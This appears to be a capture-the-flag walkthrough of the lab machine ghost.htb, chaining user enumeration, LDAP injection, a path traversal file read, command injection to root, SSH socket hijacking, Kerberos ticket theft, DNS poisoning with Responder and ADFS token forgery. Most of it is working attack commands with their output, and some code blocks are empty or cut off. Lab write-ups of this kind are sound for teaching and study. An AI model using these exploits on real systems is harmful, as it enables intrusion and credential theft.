Potential user `kathryn.holland`?

Opening the post, i can see the author `kathryn.holland` has a page inside `/author/`, its possible i can use this to find valid users

![](Pasted%20image%2020260825171334.png)

Using wappalyzer i can see that this service is being run off an ubuntu machine, this is likely the virtualization i mentioned earlier

```python
nxc smb dc01.ghost.htb -u kathryn.holland -p '' -k
SMB         dc01.ghost.htb  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.ghost.htb  445    DC01             [-] ghost.htb\kathryn.holland: KDC_ERR_PREAUTH_FAILED
```

Using kerberos i am able to use error output to determine valid users, looks like `kathryn.holland` is a valid domain user, this give me a valid username format

## CVE-2022-41697

> A user enumeration vulnerability exists in the login functionality of Ghost Foundation Ghost 5.9.4. A specially-crafted HTTP request can lead to a disclosure of sensitive information. An attacker can send a series of HTTP requests to trigger this vulnerability.

https://talosintelligence.com/vulnerability_reports/TALOS-2022-1625

```python
curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H 'Content-Type: application/json' --data '{"username":"lkjasdfklasjdf@asdf.com","password":"asdfasdfasdf"}' | jq .

{
  "errors": [
    {
      "message": "There is no user with that email address.",
      "context": null,
      "type": "NotFoundError",
      "details": null,
      "property": null,
      "help": null,
      "code": null,

      "ghostErrorCode": null
    }
  ]
}
```

Ill use the example POC in the article and see the error, this indicates this user doesnt exist

```python
curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H 'Content-Type: application/json' --data '{"username":"kathryn.holland@ghost.htb","password":"asdfasdfasdf"}'
{"errors":[{"message":"Your password is incorrect.","context":"Your password is incorrect.","type":"ValidationError","details":null,"property":null,"help":"Visit and save your profile after logging in to check for problems.","code":"PASSWORD_INCORRECT","id":"71ce7d20-a0a2-11f1-a02f-09a7d9773575","ghostErrorCode":null}]}
```

But if i now test this POC with a user i know exists, i can see i get an error `Your password is incorrect` confirming the POC works

Another thing to note, the API is using domain credentials, since i know the user `kathryn.holland` is a domain user

```python
curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H 'Content-Type: application/json' --data '{"username":"kathryn.holland@ghost.htb","password":"asdfasdfasdf"}' | jq . 
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    394 100    328 100     66   4522    909                              0
{
  "errors": [
    {
      "message": "Too many login attempts. Please wait 3 minutes before trying again, or reset your password.",
      "context": "Too many login attempts.",
      "type": "TooManyRequestsError",
      "details": null,
      "property": null,
      "help": "Too many login attempts.",
      "code": null,
      "id": "898d7aa0-a0a3-11f1-a02f-09a7d9773575",
      "ghostErrorCode": null
    }
  ]
}
```

If i send another request i see, there is a error for too many logon attempts, this prevents me from fuzzing the application to find valid users. But since the application is using domain credentials, kerbrute will work fine to enumerate users

## Ghost logon form

![](Pasted%20image%2020260825174803.png)

When trying the logon, it uses that session endpoint, used above to try and find valid users

The forgot password function, doesnt actually send a request anywhere, eventually the request times out

## Subdomains
```python
ffuf -u http://ghost.htb:8008/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.ghost.htb' -ic -c -t 30 -fs 7676

![](Pasted%20image%2020260825182240.png)

I am logged in as `kathryn.holland`

Also some interesting info on the homescreen

![1203](Pasted%20image%2020260826165723.png)

Some info on more users, thise looks to be domain users too!

![1324](Pasted%20image%2020260826170046.png)

Found another subdomain `bitbucket.ghost.htb`

The bitbucket subdomain doesnt show anything, as shown in the screenshot above, the DNS entry is not configured

There is not a lot of functionality in this site, mostly just information

So i will safely assume there is a gitea subdomain, in all fairness im surprised none of these wordlists ive used contain gitea in them

# `gitea` subdomain

![](Pasted%20image%2020260826175125.png)

I have found the gitea install

![](Pasted%20image%2020260826175216.png)

Found the gitea version

I can also use `Explore` in the top left of the sight to view as a guest

![](Pasted%20image%2020260826175318.png)

Found some users

There is no repos or archived repos, ive tried using some default credentials but no luck

Im thinking i can use the LDAP injection on the intranet subdomain to pull out the secret, becuase remembering back it said domain logons were disabled, but i could log on to gitea using the secret and it could be found in LDAP

Ill prixy this request using caido

# LDAP injection to find `gitea_temp_principal` secret

Using the target account set as the username, a `*` will search through the attributes until it find a match to `gitea_temp_principal`

So by placing a character in the password field followed by a `*` will either give an error for a incorrect character or a success for a correct character

```python

```

This is what a valid request looks like just using the `*` in the secret field

So i already know it can only contain letters and numbers from the `/profile` endpoint:

![](Pasted%20image%2020260826202843.png)

So i can use a character wordlist to find the correct secret

Ill create a wordlist to do this

```python

```

Ill grab the request and upload it to caido so i can fuzz this in caido

![](Pasted%20image%2020260826205015.png)

As seen here the letter `s` gives a different response length

I also dont think it is case sensitive

![](Pasted%20image%2020260826205125.png)

Now its followed by `z`, ill continue this process until it all characters return the same response length i.e. they all cause errors

```python
szrr8kpc3z6onlqf
```

![](Pasted%20image%2020260826205622.png)

After re running this until all responses had the same length i find the secret, now i can log into the gitea instance

# Access to gitea instance as `gitea_temp_principal`

![](Pasted%20image%2020260826205813.png)

Found two private repos

There are no hardcoded credentials

Ill have a look through some of this source code

# Local file inclusion in the blog 

After running some analysis on the source code in both repos, i found two interesting vulnerabilities, one which is RCE in intranet but it is currently locked and needs a value called `DEV_INTRANET_KEY` which i dont yet have

But there is another vulnerability in the blog which is a file inclusion vulnerability in `posts-public.js` 

```python
const extra = frame.original.query?.extra;
if (extra) {
    const fs = require("fs");
    if (fs.existsSync(extra)) {
        const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
        posts.meta.extra = { [extra]: fileContent };
    }
}
```

I should be able to exploit this file read vulnerability using the API key given in the blogs readme

```python
a5af628828958c976a3b6cc81a
```

I will now attempt to read `/etc/passwd`

```python

```

As seen here, at the bottom of the output i can read files, which means i should be able to dump the `DEV_INTRANET_KEY` to then get RCE

```python
curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../var/lib/ghost/extra/important' 

...[SNIP]...

"extra":{"../../../../var/lib/ghost/extra/important":"659cdeec9cd6330001baefbf\n"}}}  
```

So there was nothing else interesting this file

![](Pasted%20image%2020260827175100.png)

So from this screenshot i can assume the database is at the path: `/var/lib/ghost/content/data/ghost.db`

Upon output of this file, i see it is massive and would be a pain to find the exact value i want, so instead ill check `/proc/self/environ` since its exported as an environment variable in the repo

```python
curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../proc/self/environ'

...[SNIP]...

"extra":{"../../../../proc/self/environ":"HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000"
```

I now have the `DEV_INTRANET_KEY`

```python
DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
```

# Remote code execution on the Ubuntu server

```python
// Scans an url inside a blog post
// This will be called by the blog to ensure all URLs in posts are safe
#[post("/scan", format = "json", data = "<data>")]
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
    // currently intranet_url_check is not implemented,
    // but the route exists for future compatibility with the blog
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();
```

This code is in the intranet repo, specifically `intranet/backend/src/api/dev/scan.rs`

This code takes json input from the POST request and processes it using bash, this is the RCE vector i mentioned earlier in the `/scan` endpoint

Anything placed inside `{"url":"<value>"}` will be ran with bash

```python
use rocket::http::Status;
use rocket::Request;
use rocket::request::{FromRequest, Outcome};

pub(crate) mod scan;

pub struct DevGuard;

#[rocket::async_trait]
impl<'r> FromRequest<'r> for DevGuard {
    type Error = ();

    async fn from_request(request: &'r Request<'_>) -> Outcome<Self, Self::Error> {
        let key = request.headers().get_one("X-DEV-INTRANET-KEY");
        match key {
            Some(key) => {
                if key == std::env::var("DEV_INTRANET_KEY").unwrap() {
                    Outcome::Success(DevGuard {})
                } else {
                    Outcome::Error((Status::Unauthorized, ()))
                }
            },
            None => Outcome::Error((Status::Unauthorized, ()))
        }
    }
}
```

However this was the code that meant i couldnt reach the endpoint to get RCE without the `DEV_INTRANET_KEY` which was stored an environment variable, which i now have through LFI

As seen in this code stored at `intranet/backend/src/api/dev.rs` it takes the environments variable as a HTTP header in the request to the endpoint then matches the value to the environment variable if it matches you can reach the endpoint if not it returns an error

![](Pasted%20image%2020260827190048.png)

This screenshot from the intranet repo readme shows the API is at `/api-dev` and i already know the vulnerable endpoint is `/scan`, so the endpoint is going to be `/api-dev/scan`

```python
curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'Content-Type: application/json' -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' --data '{"url":"http://localhost; id"}' | jq .
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    217 100    187 100     30   4110    659                              0
{
  "is_safe": true,
  "temp_command_success": true,
  "temp_command_stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
}
```

I now have RCE

All i needed to do was set the request to POST like it says to do in `scan.rs` and pass the valid key found via LFI as well as the content type header, then simply pass the command into the json body

Its also worth noting the app is already running as root so after getting a shell i shouldnt need to do any priv esc

```python
penelope -p 1337
```

So ill start a listener

![](Pasted%20image%2020260827190635.png)

Ill send the request

![](Pasted%20image%2020260827190732.png)

I now have a root shell on the container running on the ubuntu server

# Access as `florence.ramirez` on the ubuntu server (container escape)

```python
root@36b733906694:~/.ssh/controlmaster# ls -la
total 12
drwxr-xr-x 1 root root 4096 Aug 27 15:51 .

srw------- 1 root root    0 Aug 27 15:51 florence.ramirez@ghost.htb@dev-workstation:22
```

I have found a controlmaster socket file for a user called `florence.ramirez`

```python
root@36b733906694:~# ssh -S ~/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 florence.ramirez@ghost.htb
Last login: Thu Feb  1 23:58:45 2024 from 172.18.0.1
florence.ramirez@LINUX-DEV-WS01:~$
```

I can use this to login to the machine, now escaping the container

```python
florence.ramirez@LINUX-DEV-WS01:/$ id
uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
```

I am part of two interesting groups

```python
florence.ramirez@LINUX-DEV-WS01:/$ find / -group it 2>/dev/null
```

There are no files belonging to the IT group

```python
florence.ramirez@LINUX-DEV-WS01:/$ find / -group staff 2>/dev/null

...[SNIP]...

/tmp/krb5cc_50
```

Looks like i have found a kerberos ticket

```python
florence.ramirez@LINUX-DEV-WS01:/$ klist

Ill use this ticket to get initial access the domain!

```

Ill encode the output of the ticket in base64 then output it to the screen, ill then copy this to my machine and save it to a file **making sure the ticket is on ONE line** 

```python
cat florenceramirez.b64 | base64 -d | tee florenceramirez.ccache
```

So once the file is on one line ill decode the base64 and direct the output to the ccache file

```python
export KRB5CCNAME=florenceramirez.ccache
```

Now i can test access

```python
nxc smb dc01.ghost.htb --use-kcache                      
SMB         dc01.ghost.htb  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.ghost.htb  445    DC01             [+] GHOST.HTB\florence.ramirez from ccache
```

IT WORKS!

# Adding DNS record to coerce authentication

So if i remember earlier i saw a message on the intranet that the connection to `bitbucket` wasnt working and the sysadmin replied saying the DNS entry does not yet exist

Now i have domain credentials i should be able to add one for bitbucket, and place it with my IP address

```python
sudo responder -I tun0
```

So first ill start responder to catch the NTLM hash

```python
bloodyAD --host dc01.ghost.htb -d ghost.htb -u florence.ramirez -k ccache=florenceramirez.ccache add dnsRecord bitbucket 10.10.14.61 
[+] bitbucket has been successfully added
```

Ill add the record

```python

Now i have the blob and the keys

I now need to ensure both of these things are formatted correctly before i can use them

```python
FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7
8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1
```

So both of these keys need to have the dashes removed, and the hex form converted back to decimal

```python
echo 'FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7' | tr -d '-'
FADB3A06DDCD4057DD417D8107A0F4B314FA2B6B70BBBBF528A7212961CB21C7

echo '8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1' | tr -d '-'
8DACA490702B3FD608D5BC35A9848756D2FA3B7B7413A3C62C58A6F458FB9DA1
```

Now the dashes are removed ill convert the string back to decimal

```python
echo 'FADB3A06DDCD4057DD417D8107A0F4B314FA2B6B70BBBBF528A7212961CB21C7' | xxd -r -p | tee privkey1.bin

echo '8DACA490702B3FD608D5BC35A9848756D2FA3B7B7413A3C62C58A6F458FB9DA1' | xxd -r -p | tee privkey2.bin
```

Now both keys are set, i can move onto the encrypted blob

```python
echo 'AAAAAQAAAAAEEAF...[SNIP]...7xDevBN/BEsNEUSTXxm' | base64 -d | tee enc_blob.bin
```

The blob just needs base64 decoding then placining into a file

Now everything is setup i can run ADFSpoof

```python
python ./ADFSpoof.py \
       --blob ../enc_blob.bin ../privkey2.bin \
       --server federation.ghost.htb saml2 \
